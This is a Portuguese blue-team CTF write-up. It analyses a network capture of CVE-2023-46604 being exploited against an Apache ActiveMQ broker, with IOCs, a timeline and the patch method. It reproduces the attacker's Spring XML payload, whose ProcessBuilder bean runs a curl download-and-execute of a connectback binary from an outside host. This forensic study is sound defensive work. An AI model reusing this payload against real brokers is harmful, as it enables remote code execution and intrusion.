# 🔍 OpenWire — CTF Writeup
### CyberDefenders Blue Team Challenge | Forense de Rede & Exploração de CVE-2023-46604 (Apache ActiveMQ)

---

| **Analista**          | Mauricio Robert                                                          |
|-----------------------|--------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                        |
| **Data do Relatório** | 16/06/2026                                                               |
| **Data do Incidente** | 12/12/2023                                                               |
| **Classificação**     | CONFIDENCIAL                                                             |
| **Ferramentas**       | Wireshark · NetworkMiner 3.1 · Zui (Brim) · VirusTotal · VulDB          |
| **Arquivo**           | `c119-OpenWire.pcap` — Captura de tráfego de rede (Network Forensics)   |

---

## 🔍 Resumo Executivo

A análise forense de rede da captura **`c119-OpenWire.pcap`** revelou a exploração da vulnerabilidade crítica **CVE-2023-46604** (desserialização no protocolo OpenWire, CWE-502) contra um broker **Apache ActiveMQ 5.18.0** hospedado em **134.209.197.3**. O ataque partiu do IP **146.190.21.92**, que se conectou à porta TCP **61616** (OpenWire) e enviou um pacote OpenWire malformado abusando do método `BaseDataStreamMarshaller.createThrowable()`, forçando o broker a instanciar uma classe Java arbitrária. Como consequência, o broker comprometido buscou e processou um arquivo de configuração Spring (`invoice.xml`) hospedado pelo próprio atacante na porta 8000, contendo um bean da classe **`java.lang.ProcessBuilder`** configurado para executar comandos do sistema operacional. Esse comando baixou e executou um segundo payload — um executável **ELF de 250 bytes chamado `docker`** — a partir de um **segundo servidor C2 (128.199.52.72)**, identificado pelo VirusTotal (42/65 motores) como um *trojan shellcode/connectback* da família Metasploit. A falha foi corrigida pela Apache com a introdução do método **`OpenWireUtil.validateIsThrowable()`**, que passou a impedir a instanciação de classes que não estendem `Throwable`.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta                | Finalidade                                                                                                                   |
|----------------------------|--------------------------------------------------------------------------------------------------------------------------|
| **Wireshark**              | Dissecação do protocolo OpenWire, filtragem por porta/stream (`tcp.port == 61616`, `tcp.stream eq 1`), Follow HTTP Stream para extração do payload XML |
| **NetworkMiner 3.1**       | Reconstrução de arquivos transferidos via HTTP (aba *Files*), fingerprinting de hosts e sistemas operacionais (aba *Hosts*) |
| **Zui (Brim)**              | Consulta aos logs Zeek (`conn`, `http`, `files`, `stats`) gerados a partir do pcap, correlação de metadados de sessão     |
| **VirusTotal**              | Verificação de reputação do hash SHA-256 do payload ELF `docker` e classificação da ameaça                                |
| **VulDB / NVD / CISA KEV**  | Pesquisa e confirmação da vulnerabilidade CVE-2023-46604, score CVSS, versões afetadas e versões corrigidas                |
| **Brave Search**            | Pesquisa OSINT para identificação do serviço associado à porta TCP 61616                                                    |

---

## 📋 Perguntas e Respostas

### Q1 — Qual é o IP do servidor C2 que se comunicou com o nosso servidor?

> **Resposta: `146.190.21.92`**

**Solução:** A consulta aos logs Zeek via **Zui (Brim)** sobre `c119-OpenWire.pcap` revelou um registro `conn` com `orig_h: 146.190.21.92`, `orig_p: 47284`, `resp_h: 134.209.197.3`, `resp_p: 61616`, `proto: tcp`, `conn_state: "SF"` e `duration: 298.594ms`. A confirmação cruzada no Wireshark, com o filtro `tcp.port == 61616`, mostrou a mesma conversação:

```
146.190.21.92:47284 → 134.209.197.3:61616  [SYN]
134.209.197.3:61616 → 146.190.21.92:47284  [SYN, ACK]
134.209.197.3 → 146.190.21.92  OpenWire 408 WireFormatInfo
146.190.21.92 → 134.209.197.3  OpenWire 190 ExceptionResponse [Malformed Packet]
```

Como **146.190.21.92** foi quem originou a conexão em direção ao nosso broker (e, em seguida, enviou o pacote OpenWire malformado que desencadeou a exploração), ele foi identificado como o **IP do servidor C2 primário**.

---

### Q2 — Qual é o número da porta do serviço que o adversário explorou?

> **Resposta: `61616`**

**Solução:** A análise da conversação TCP isolada no passo anterior mostrou que toda a comunicação maliciosa ocorreu sobre a porta TCP **61616**, dissecada pelo Wireshark nativamente como protocolo **OpenWire**. A janela de detalhes do pacote 4 confirma o cabeçalho do protocolo:

```
OpenWire (WireFormatInfo)
    Length: 338
    Command: WireFormatInfo (1)
    Magic: ActiveMQ
    Version: 12
```

---

### Q3 — Qual é o nome do serviço considerado vulnerável?

> **Resposta: `Apache ActiveMQ`**

**Solução:** Uma pesquisa OSINT ("qual serviço roda na porta 61616") confirmou que a porta 61616 é a porta padrão do protocolo proprietário **OpenWire**, utilizado pelo **Apache ActiveMQ** para comunicação cliente-broker. Essa identificação foi corroborada diretamente pelo conteúdo do próprio pacote `WireFormatInfo` (Objeto Map, 13 entradas), que expõe os campos:

```
Entry: ProviderName  → String: "ActiveMQ"
Entry: ProviderVersion → String: "5.18.0"
Entry: PlatformDetails → String: "Java"
```

Confirmando o serviço como **Apache ActiveMQ**, versão **5.18.0** — build que se encontra dentro da faixa de versões afetadas pela CVE-2023-46604 (até 5.15.15 / 5.16.6 / 5.17.5 / **5.18.2**).

---

### Q4 — Qual é o IP do segundo servidor C2?

> **Resposta: `128.199.52.72`**

**Solução:** A aba **Hosts** do **NetworkMiner** listou os endpoints observados no pcap. Dois IPs não apresentaram fingerprint de sistema operacional associado (diferentemente de `134.209.197.3`, identificado como Linux) — um deles era `146.190.21.92` (já identificado como C2 primário) e o outro era:

```
IP:               128.199.52.72
Open TCP Ports:   80 (HTTP)
Web Server Banner: SimpleHTTP/0.6 Python/3.8.10
Sent:              5 packets (719 bytes)
Received:          5 packets (351 bytes)
Incoming sessions: 1
```

Esse segundo endereço, distinto do primeiro C2 e usado em uma etapa posterior da cadeia de ataque (download do payload final), foi identificado como o **segundo servidor C2**.

---

### Q5 — Qual é o nome do executável shell reverso descartado no servidor?

> **Resposta: `docker`**

**Solução:** A aba **Files** do NetworkMiner reconstruiu três arquivos transferidos via HTTP na captura:

```
Filename       Extension   Size    Source            Destination
invoice.xml    xml         816 B   146.190.21.92:8000 → 134.209.197.3
invoice[1].xml xml         816 B   146.190.21.92:8000 → 134.209.197.3
docker.elf     elf         250 B   128.199.52.72:80   → 134.209.197.3
```

O terceiro arquivo, um binário **ELF de 250 bytes**, corresponde à requisição HTTP `GET /docker HTTP/1.1` (Host: `128.199.52.72`) e ao comando embutido no payload XML — `curl -s -o /tmp/docker http://128.199.52.72/docker`. O NetworkMiner adiciona a extensão `.elf` automaticamente ao identificar a assinatura binária (`7F 45 4C 46` — *magic bytes* ELF), mas o nome real do arquivo, conforme requisitado e salvo no disco da vítima (`/tmp/docker`), é **`docker`**. A análise de hash no **VirusTotal** confirmou se tratar de um payload malicioso:

```
MD5:     8102680b91c6be67d875ddf8170778c
SHA-1:   fc647efbc8f1b47b490079e56aed150e2721e0d2
SHA-256: bb9af7d0d210754cbb6323cde3dbfbc38d666739472a9abd2d99d99dda50b84d
Detecção: 42/65 motores
Rótulo:  trojan.shellcode/connectback
Famílias: shellcode · connectback · metasploit
```

---

### Q6 — Qual classe Java foi utilizada no arquivo XML para executar o exploit?

> **Resposta: `java.lang.ProcessBuilder`**

**Solução:** Seguindo o stream TCP (`tcp.stream eq 1`) no Wireshark, a resposta HTTP à requisição `GET /invoice.xml` (servida por `146.190.21.92:8000`, `Server: SimpleHTTP/0.6 Python/3.8.10`, 816 bytes) revelou um arquivo de definição de beans do **Spring Framework**:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans" ...>
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker</value>
            </list>
        </constructor-arg>
    </bean>
</beans>
```

Ao carregar esse XML, o Spring instancia o bean `pb` da classe **`java.lang.ProcessBuilder`** e, por conta do atributo `init-method="start"`, invoca imediatamente o método `start()` — executando o comando definido na lista de argumentos do construtor e concretizando a execução remota de código no broker.

---

### Q7 — Tendo identificado a vulnerabilidade explorada, qual é o número de CVE associado a ela?

> **Resposta: `CVE-2023-46604`**

**Solução:** A pesquisa da vulnerabilidade no **VulDB** (entrada 243730) confirmou:

```
Título:    Apache ActiveMQ/ActiveMQ Legacy OpenWire Module
           up to 5.15.15/5.16.6/5.17.5/5.18.2 — OpenWire Protocol Deserialization
CVE:       CVE-2023-46604
CWE:       CWE-502 (Deserialization of Untrusted Data)
CVSS Meta Temp Score: 8.9
Publicado: 27/10/2023
CISA KEV:  Adicionado em 02/11/2023
Correção:  Versões 5.15.16, 5.16.7, 5.17.6 ou 5.18.3
```

A vulnerabilidade permite que um atacante remoto, com acesso de rede ao broker, manipule os tipos de classe serializados no protocolo OpenWire para fazer com que o broker instancie qualquer classe disponível em seu *classpath* — exatamente o comportamento observado nos pacotes `WireFormatInfo`/`ExceptionResponse` capturados na Q1, que abusam do método `BaseDataStreamMarshaller.createThrowable()` para instanciar classes como `org.springframework.context.support.ClassPathXmlApplicationContext`, apontando para a URL maliciosa `http://146.190.21.92:8000/invoice.xml`.

---

### Q8 — Qual classe e método Java implementam a etapa de validação adicionada pela correção, para garantir que apenas classes válidas (que estendem `Throwable`) possam ser instanciadas?

> **Resposta: `OpenWireUtil.validateIsThrowable`**

**Solução:** A análise do *advisory* de segurança da Debian LTS (diff oficial do pacote `activemq`) mostrou a correção aplicada ao código-fonte. Foi introduzida uma nova classe utilitária, **`org.apache.activemq.openwire.OpenWireUtil`**, contendo o método estático:

```java
public static void validateIsThrowable(Class<?> clazz) {
    if (!Throwable.class.isAssignableFrom(clazz)) {
        throw new IllegalArgumentException("Class " + clazz + " is not assignable to Throwable");
    }
}
```

Esse método passou a ser chamado dentro de `BaseDataStreamMarshaller.createThrowable()` — o mesmo método abusado na exploração original — imediatamente após a chamada insegura `Class.forName(className)` e antes de qualquer instanciação via reflexão, eliminando a possibilidade de instanciar classes arbitrárias que não sejam exceções legítimas. Para validar o entendimento da lógica do patch, foi reproduzido um exemplo simplificado em Java (`Demo.java`) replicando o padrão de validação por reflexão antes da correção ser aplicada ao broker.

---

## ⛓ Linha do Tempo do Ataque

```
[12/12/2023 13:38:27 UTC] CONEXÃO TCP INICIAL
    146.190.21.92:47284 → 134.209.197.3:61616  [SYN / SYN,ACK / ACK]
    ↓
[13:38:27.128] HANDSHAKE OPENWIRE
    Broker (134.209.197.3) responde com WireFormatInfo
    Magic: ActiveMQ | Version: 12 | ProviderVersion: 5.18.0
    ↓
[13:38:27.130] PACOTE DE EXPLORAÇÃO — CVE-2023-46604
    146.190.21.92 envia OpenWire ExceptionResponse [Malformed Packet]
    Abusa de BaseDataStreamMarshaller.createThrowable() sem validação de tipo
    Classe instanciada: org.springframework.context.support.ClassPathXmlApplicationContext
    Argumento: http://146.190.21.92:8000/invoice.xml
    ↓
[13:38:28] CALLBACK HTTP — DOWNLOAD DO PAYLOAD XML
    GET /invoice.xml HTTP/1.1 (Host: 146.190.21.92:8000)
    Resposta 200 OK — Server: SimpleHTTP/0.6 Python/3.8.10 (816 bytes)
    Bean Spring "pb" (java.lang.ProcessBuilder) instanciado e iniciado
    ↓
[13:38:28] EXECUÇÃO DE COMANDO NO BROKER
    bash -c "curl -s -o /tmp/docker http://128.199.52.72/docker;
              chmod +x /tmp/docker; ./tmp/docker"
    ↓
[13:38:28] DOWNLOAD DO PAYLOAD ELF — SEGUNDO C2
    GET /docker HTTP/1.1 (Host: 128.199.52.72)
    Payload ELF de 250 bytes baixado e salvo em /tmp/docker
    SHA-256: bb9af7d0d210754cbb6323cde3dbfbc38d666739472a9abd2d99d99dda50b84d
    ↓
[13:38:28 — pós-execução] SHELL REVERSO ESTABELECIDO
    Binário "docker" executado (chmod +x && ./tmp/docker)
    VirusTotal: 42/65 motores — trojan.shellcode/connectback (família Metasploit)
```

---

## 🗺 Mapeamento Investigativo

| Pergunta | Fonte de Evidência | Artefato |
|----------|--------------------|----------|
| C2 primário | Zui/Brim → Zeek `conn.log` (porta 61616) + Wireshark | `146.190.21.92:47284 → 134.209.197.3:61616` |
| Porta explorada | Wireshark → dissecação do protocolo OpenWire | TCP/61616 |
| Serviço vulnerável | OSINT + campo `ProviderName`/`ProviderVersion` do `WireFormatInfo` | Apache ActiveMQ 5.18.0 |
| C2 secundário | NetworkMiner → aba *Hosts* (sem fingerprint de SO) | `128.199.52.72` |
| Executável shell reverso | NetworkMiner → aba *Files* + Wireshark `GET /docker` | `docker` (`docker.elf`) |
| Classe Java no XML | Wireshark → Follow TCP Stream (`tcp.stream eq 1`) | `java.lang.ProcessBuilder` |
| CVE da vulnerabilidade | VulDB / NVD / CISA KEV | `CVE-2023-46604` |
| Classe/método de validação (patch) | Debian LTS Security Advisory (diff do patch) | `OpenWireUtil.validateIsThrowable` |

---

## 🚨 Artefatos e Indicadores Identificados (IOCs)

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Vítima / Broker | `134.209.197.3` | Servidor Apache ActiveMQ 5.18.0 comprometido (porta 61616) |
| C2 primário | `146.190.21.92` | Origem do pacote de exploração OpenWire; hospeda `invoice.xml` na porta 8000/HTTP |
| C2 secundário | `128.199.52.72` | Hospeda o payload ELF `docker` na porta 80/HTTP (`SimpleHTTP/0.6 Python/3.8.10`) |
| Host adicional observado | `84.239.49.16` | 12 pacotes / 712 bytes no pcap; sem evidência direta de atividade maliciosa |
| Porta explorada | TCP/61616 | Protocolo OpenWire (Apache ActiveMQ) |
| CVE | `CVE-2023-46604` | Desserialização no OpenWire Protocol Handler — RCE crítico (CWE-502) |
| Versão vulnerável | ActiveMQ 5.18.0 | Identificada no campo `ProviderVersion` do `WireFormatInfo` |
| Método vulnerável | `BaseDataStreamMarshaller.createThrowable()` | Instancia classes via reflexão sem validar herança de `Throwable` |
| Correção (patch) | `OpenWireUtil.validateIsThrowable()` | Valida que a classe estende `Throwable` antes da instanciação |
| Classe abusada (RCE) | `java.lang.ProcessBuilder` | Bean Spring em `invoice.xml`; `init-method="start"` executa comando OS |
| Payload XML | `invoice.xml` | 816 bytes; servido por `146.190.21.92:8000`; define o bean `ProcessBuilder` |
| Comando executado | `curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker` | Baixa e executa o payload do segundo C2 |
| Payload ELF | `docker` (extraído como `docker.elf`) | 250 bytes; binário ELF 64-bit |
| MD5 | `8102680b91c6be67d875ddf8170778c` | Hash do executável `docker` |
| SHA-1 | `fc647efbc8f1b47b490079e56aed150e2721e0d2` | Hash do executável `docker` |
| SHA-256 | `bb9af7d0d210754cbb6323cde3dbfbc38d666739472a9abd2d99d99dda50b84d` | Hash do executável `docker` |
| Detecção VirusTotal | 42/65 motores | Rótulo: `trojan.shellcode/connectback` — famílias: shellcode, connectback, metasploit |

---

## ✅ Resumo das Flags

| # | Pergunta | Flag / Resposta |
|---|----------|------------------|
| Q1 | IP do C2 primário | `146.190.21.92` |
| Q2 | Porta do serviço explorado | `61616` |
| Q3 | Nome do serviço vulnerável | `Apache ActiveMQ` |
| Q4 | IP do segundo servidor C2 | `128.199.52.72` |
| Q5 | Nome do executável shell reverso | `docker` |
| Q6 | Classe Java usada no XML para o exploit | `java.lang.ProcessBuilder` |
| Q7 | CVE associado à vulnerabilidade | `CVE-2023-46604` |
| Q8 | Classe/método Java da etapa de validação (patch) | `OpenWireUtil.validateIsThrowable` |

---

## 📚 Referências

- [CyberDefenders — OpenWire CTF Challenge](https://cyberdefenders.org/blueteam-ctf-challenges/openwire/)
- [Apache ActiveMQ Security Advisories — CVE-2023-46604](https://activemq.apache.org/security-advisories.data/CVE-2023-46604-announcement.txt)
- [VulDB — Entry 243730 (OpenWire Protocol Deserialization)](https://vuldb.com/vuln/243730)
- [NVD — CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [CISA Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- [VirusTotal](https://www.virustotal.com/)
- [Wireshark](https://www.wireshark.org/)
- [NetworkMiner](https://www.netresec.com/?page=NetworkMiner)
- [Zeek / Zui (Brim)](https://zeek.org/)

---